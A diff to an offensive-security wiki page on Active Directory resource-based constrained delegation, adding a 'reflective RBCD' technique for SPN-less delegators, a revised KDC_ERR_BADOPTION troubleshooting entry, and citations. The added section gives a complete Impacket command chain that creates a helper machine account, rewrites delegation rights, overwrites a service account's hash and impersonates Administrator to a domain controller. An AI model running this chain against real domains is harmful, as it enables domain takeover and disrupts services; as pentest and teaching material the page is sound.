@@ -134,6 +134,27 @@ Notes
 - Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
 - Impacket can rewrite the `sname` ("AnySPN") for some tools, but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
+### Reflective RBCD for an SPN-less Kerberos-only delegator
+
+A compromised user with **`msDS-AllowedToDelegateTo` but no SPN or `TrustedToAuthForDelegation`** cannot produce the forwardable evidence ticket needed for [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) with ordinary S4U2Self.<sup>[[1]](#references)[[18]](#references)</sup> If that user can write RBCD on its **own** AD object, an attacker-controlled SPN-bearing account can delegate *to the user* first.<sup>[[1]](#references)[[18]](#references)</sup> This RBCD hop yields a forwardable ticket for the impersonated user to the SPN-less account, which becomes evidence for a second S4U2Proxy to an SPN in the compromised account's classic delegation allow-list.<sup>[[18]](#references)[[19]](#references)</sup>
+
+For the SPN-less first hop, the helper account's S4U2Proxy request must use **U2U**: `enc-tkt-in-skey` makes the KDC encrypt the ticket with the delegator's TGT session key rather than looking up an SPN key.<sup>[[18]](#references)[[19]](#references)</sup> The KDC also needs the RBCD bit in `PA-PAC-OPTIONS`, the delegator's TGT, and the S4U2Self evidence ticket.<sup>[[18]](#references)[[20]](#references)</sup> The author's Impacket `getST.py` fork adds `-nospn` and `-tgt` for this request; the `-nospn`/`-tgt` support is in upstream Impacket PR #2324, so use the linked fork rather than assuming stock `getST.py` supports that step.<sup>[[18]](#references)[[20]](#references)</sup>
+
+This example assumes `svc_web` is compromised, may write its own RBCD attribute, and is allowed to delegate to `host/dc01.corp.local`. It also assumes an SPN-bearing helper can be created, RC4 is permitted, and the selected `Administrator` is delegable. Request an **RC4 TGT** with the compromised account's NT hash. Run the **first** `getST.py` from the author's fork; inspect the `describeTicket.py` output and substitute its **RC4 TGT session key** below. The last `getST.py` can be stock Impacket. Perform the TGT request **before** changing the NT hash; this change disrupts the service account until its password is reset.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>
+
+```bash
+pypykatz crypto nt 'OldPass!'
+getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
+describeTicket.py svc_web.ccache
+addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
+rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
+changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
+python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
+KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
+```
+
+Unlike the [SPN-less RBCD route below](#spn-less-cross-domain--cross-forest-rbcd), this chain uses the SPN-less account as the **RBCD target and then the classic KCD delegator**. It still needs another controlled account with an SPN. If `MachineAccountQuota=0`, an already-controlled SPN account can replace the new computer; zero quota alone does not prevent this path.<sup>[[18]](#references)[[19]](#references)</sup>
+
 ## Cross-domain & cross-forest RBCD
 
 If the **delegating principal** you control lives in a **different domain** (or even a **different forest**) than the **resource computer**, the abuse is still **RBCD**, but the ticket flow is no longer the usual single-domain `S4U2Self -> S4U2Proxy`.
@@ -355,11 +376,7 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 - **`KDC_ERR_ETYPE_NOSUPP`** during **SPN-less RBCD**: recent DCs may reject the forced **RC4-HMAC** path required by the `S4U2Self+U2U` + session-key-substitution trick. Try a classic **SPN-backed** RBCD path with AES instead.<sup>[[10]](#references)[[15]](#references)</sup>
 - **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
 - **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-- **`KDC_ERR_BADOPTION`**: This may mean:
-  - The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  - The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  - The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-  - You are abusing classic KCD; remember RBCD works with non-forwardable S4U2Self tickets, while KCD requires forwardable.
+- **`KDC_ERR_BADOPTION`** during S4U2Proxy: Check the impersonated account's delegation restrictions, the evidence ticket's forwardable flag, and whether classic KCD or the target's RBCD descriptor authorizes this hop. This is a **KDC delegation-policy error**, not a test of whether the target service is running or whether the user has application-level access. An unregistered target SPN normally produces **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** instead.<sup>[[21]](#references)[[22]](#references)</sup>
 
 ## Notes, relays and alternatives
 
@@ -397,6 +414,12 @@ adws-enumeration.md
 - [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
 - [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
 - [16] [Microsoft Open Specifications – S4U2Proxy details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
+- [17] [James Forshaw - Exploiting RBCD Using a Normal User Account](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
+- [18] [Hunter Wade - Abusing Constrained Delegation without Protocol Transition against SPN-less accounts](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
+- [19] [Sprocket Security - Abusing Constrained Delegation Without Protocol Transition Against SPN-less Accounts](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
+- [20] [Impacket PR #2324 - S4U2Proxy with U2U](https://github.com/fortra/impacket/pull/2324)
+- [21] [Microsoft MS-SFU - Using ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
+- [22] [Microsoft Learn - Enable Kerberos event logging](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
 
 
 {{#include ../../banners/hacktricks-training.md}}
